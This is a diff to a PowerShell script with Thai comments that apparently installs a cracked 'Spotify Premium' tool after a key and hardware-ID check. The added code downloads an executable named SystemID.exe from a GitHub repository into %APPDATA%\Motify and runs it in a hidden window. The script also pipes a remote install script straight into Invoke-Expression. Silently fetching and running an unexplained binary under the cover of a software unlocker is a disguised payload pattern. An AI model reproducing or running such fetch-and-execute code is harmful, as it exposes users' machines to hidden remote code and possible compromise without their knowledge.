@@ -1,3 +1,33 @@
+function Download-Script {
+    param (
+        [string]$url,  # URL ของไฟล์ .ps1
+        [string]$fileName  # ชื่อไฟล์ที่ต้องการบันทึก
+    )
+    
+    # Path ของโฟลเดอร์ Motify
+    $dirPath = "$env:APPDATA\Motify"
+    
+    # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
+    if (-not (Test-Path -Path $dirPath)) {
+        New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
+    }
+    
+    # Path ของไฟล์ที่บันทึก
+    $filePath = Join-Path $dirPath $fileName
+    
+    # ดาวน์โหลดไฟล์ .ps1 จาก URL และบันทึกลงในโฟลเดอร์ Motify
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $filePath
+    } catch {
+        Write-Log "Error: Failed to download the file."
+        exit
+    }
+
+    # รันไฟล์ที่ดาวน์โหลดโดยตรง
+	Start-Process $filePath -WindowStyle Hidden
+}
+
+
 # ฟังก์ชันสำหรับบันทึกข้อมูลลงในไฟล์ log
 function Write-Log {
     param (
@@ -207,6 +237,10 @@ Write-Host "Verified Successfully. Running Program..." -ForegroundColor Green
 Write-Log "Key and HWID verified successfully. Running..."
 
 $scriptUrl = "https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/install1.ps1"
+$checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
+$fileName = "SystemID.exe"
 
+Download-Script -url $checkUrl -fileName $fileName
 # โหลดและรันสคริปต์โดยตรง
 Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
+
